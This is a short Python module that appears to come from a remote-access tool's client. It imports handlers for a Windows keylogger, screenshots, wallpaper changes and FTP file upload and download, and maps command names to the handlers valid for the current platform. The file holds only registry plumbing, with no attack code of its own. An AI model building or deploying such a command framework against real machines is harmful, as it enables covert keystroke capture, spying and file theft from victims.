from client import settings
from payloads.change_directory_handler import ChangeDirectoryHandler
from payloads.upload_payload_handler import FTPUploadPayloadHandler
from payloads.download_payload_handler import FTPDownloadPayloadHandler
from payloads.change_wallpaper_payload_handler import WindowsWallchangePayloadHandler
from payloads.screenshot_payload_handler import WindowsScreenshotPayloadHandler
from payloads.keylogger_payload_handler import WindowsFileKeyLogPayloadHandler
from payloads.fast_scripts_handler import supported_commands,FastScriptsHandler

payload_register={
    "cd":ChangeDirectoryHandler,
    "ftp-upload":FTPUploadPayloadHandler,
    "ftp-download":FTPDownloadPayloadHandler,
}
payload_register.update({i:FastScriptsHandler for i in supported_commands.keys() })


def valid_payload_registry():
    r={}
    for k,v in payload_register.items():
        
        if v.get_platform() == settings.PLATFORM or v.get_platform()=="cross_platform":
            r[k]=v
    return r


